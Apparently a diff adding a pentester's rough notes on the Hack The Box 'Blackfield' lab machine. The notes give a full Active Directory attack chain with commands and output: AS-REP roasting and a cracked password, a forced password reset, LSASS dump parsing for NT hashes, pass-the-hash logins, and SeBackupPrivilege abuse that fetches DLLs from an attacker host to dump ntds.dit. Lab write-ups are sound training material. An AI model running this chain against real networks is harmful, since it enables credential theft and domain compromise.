@@ -1,0 +1,146 @@
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-15 09:15 EDT
+Nmap scan report for blackfield.htb (10.10.10.192)
+Host is up (0.056s latency).
+Not shown: 993 filtered ports
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-08-15 20:17:36Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=8/15%Time=5F37DFF6%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03");
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 7h02m06s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-08-15T20:19:55
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 191.46 seconds
+
+################################################################################
+FOOTHOLD
+################################################################################
+X - 445/tcp  open  microsoft-ds?
+  crackmapexec smb blackfield.htb 
+
+X - 3268/tcp open  ldap          
+  ldap search cant connect
+
+X - 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+  nc -vv gave: 683bd82b0e090e15f3caa401a5a494843cdeb3d2
+  internet says this is telnet-able
+    
+X - 88/tcp   open  kerberos-sec  
+
+give up and scan all ports now...:
+  88/tcp   open  kerberos-sec
+  135/tcp  open  msrpc
+  389/tcp  open  ldap
+  445/tcp  open  microsoft-ds
+  593/tcp  open  http-rpc-epmap
+  3268/tcp open  globalcatLDAP
+  5985/tcp open  wsman <------- NEW, try to get in here i think...
+
+ive been an idiot... i think ive been doing x.x.x.193 instead of 192... anyway
+ldap search is working:
+  nmap -p389 --script ldap-rootdse.nse -Pn blackfield.htb 
+  ldapsearch -x -h 10.10.10.192 -s base namingcontexts
+  ldapsearch -x -h 10.10.10.192 -b "dc=blackfield,dc=local"
+    why not work :(
+smb 445:
+  crackmapexec smb blackfield.htb  <-- worked this time
+  smbclient -L //10.10.10.192 <-- for recon
+  smbclient //10.10.10.192  <-- for mount
+    smbclient //10.10.10.192/profiles$ 
+    awk '{print %9}'
+    users.txt
+    python3 kerbrute.py -users ../users.txt -domain 10.10.10.192 -password p -dc-ip 10.10.10.192 -domain BLACKFIELD.local
+      audit2020
+      support [NO PRE AUTH] <-- install and use GetNPUsers.py bc no preauth
+      svc_backup
+      GetNPUsers.py:
+      - python GetNPUsers.py -dc-ip 10.10.10.192 -request 'BLACKFIELD.local/' -usersfile users2.txt -format hashcat:
+        - $krb5asrep$23$support@BLACKFIELD.LOCAL:907de861a9fc5c6a7b06f3a5053e0974$63ae357c7ccb3f15edf09f17571810d76acab5a0bfefe76927dca74ebf7b0165b03c242be0c39fff25ef922fbb1f66fee04dd0f7a5fddd193730994571c0dc621d16ed200470d6e1ff790613ea5752dbcf397e20c6a9d080a7b679b910376ed89e4542c6c15860b263f9ef83130745b26357457b8a22d2ae0a611f2fc0beeedc6d86ff4661b9272614798bf4df5950eb688f7be83f50a2b1991e610debb31918d9f7baef7feb4534be9681f13aaf31bde56d36557fe20d45ada53ddf75b0b69c893b934b1f4f4c62a84424ef1c80da1005f569fc8e81a44676f3e4164cefe8937fa3a8a80d131d5cd7cc02fbcd2e9e6899ae764b
+        O - cracked:
+            $krb5asrep$23$
+            support@BLACKFIELD.LOCAL
+            907de861a9fc5c6a7b06f3a5053e0974$63ae357c7ccb3f15edf09f17571810d76acab5a0bfefe76927dca74ebf7b0165b03c242be0c39fff25ef922fbb1f66fee04dd0f7a5fddd193730994571c0dc621d16ed200470d6e1ff790613ea5752dbcf397e20c6a9d080a7b679b910376ed89e4542c6c15860b263f9ef83130745b26357457b8a22d2ae0a611f2fc0beeedc6d86ff4661b9272614798bf4df5950eb688f7be83f50a2b1991e610debb31918d9f7baef7feb4534be9681f13aaf31bde56d36557fe20d45ada53ddf75b0b69c893b934b1f4f4c62a84424ef1c80da1005f569fc8e81a44676f3e4164cefe8937fa3a8a80d131d5cd7cc02fbcd2e9e6899ae764b
+            #00^BlackKnight
+              X - smbclient //10.10.10.192/SYSVOL -U support works with the password
+              X - would like to mount with:
+                sudo mount -t cifs //<IP>/VOL /TARGET, but cant pass creds...
+                have to use smbclient
+              O - rpcclient connect with creds
+                rpcclient -U support 10.10.10.192
+                enem*
+                queryuser rid
+                  X - try GetNPUsers.py on new users
+
+O - force pw reset? https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html
+    - rpcclient $> setuserinfo2 audit2020 23 'dj28*23#$%a198'
+    O - go back to smb drives and try forensic?
+        - smbclient //10.10.10.192/forensic -U audit2020 works with the password
+        O - sudo mount -v -t cifs //10.10.10.192/forensic mnt -o credentials=/root/.smb.creds
+        O - https://www.hackingarticles.in/kerberoasting-and-pass-the-ticket-attack-using-linux/
+            O - sudo pypykatz lsa -k /root/kerb minidump lsass.DMP > krb.out
+              authentication_id 406458 (633ba)
+              session_id 2
+              username svc_backup
+              domainname BLACKFIELD
+              logon_server DC01
+              logon_time 2020-02-23T18:00:03.423728+00:00
+              sid S-1-5-21-4194615774-2175524697-3563712290-1413
+              luid 406458
+                == MSV ==
+                  Username: svc_backup
+                  Domain: BLACKFIELD
+                  LM: NA
+                  NT: 9658d1d1dcd9250115e2205d9f48400d
+                    ^ evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192
+
+user.txt obtained
+
+################################################################################
+ROOT
+################################################################################
+Privilege Name                Description                    State
+============================= ============================== =======
+X - SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+  ^ this guy again? https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/
+
+O - https://pentestlab.blog/tag/diskshadow/ AND https://pure.security/dumping-windows-credentials/
+  make a shadow copy and get kerberos tickts to machine
+  https://medium.com/@sinfulz/hackthebox-xen-endgame-walkthrough-f153c137a873
+    The shadow copy needed to be accessed. SeBackupPrivilege allows the backup of the sensitive files, but a typical copy-paste of the files will not work. Because of this, the current user needs to mimic itself to look like backup software and the Win32 API calls are needed to be used to copy the sensitive files to an accessible folder. The below repository was used to do all of this:
+  
+  curl http://10.10.14.2/SeBackupPrivilegeUtils.dll -o  SeBackupPrivilegeUtils.dll
+  Import-Module .\SeBackupPrivilegeUtils.dll
+  curl http://10.10.14.2/SeBackupPrivilegeCmdLets.dll -o  SeBackupPrivilegeCmdLets.dll
+  Import-Module .\SeBackupPrivilegeCmdLets.dll
+  shadow.txt are the arguments to diskshadow (just avoids typing it out all
+  on the same line)
+    diskshadow -s shadow.txt
+    X - try just download /path/to/root.txt /local/machine
+    O - have get the hashes now... windows/NTDS
+      - Copy-FileSeBackupPrivilege z:\windows\NTDS\ntds.dit C:\temp\ntds.dit
+      - reg save hklm\system c:\temp\system.save
+      - download C:<victim> /<attacker>
+      - secretsdump.py -ntds ntds.dit -system system.save LOCAL
+        -aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee
+        - ^ log in with evil-winrm
+    cat ../Desktop/root.txt
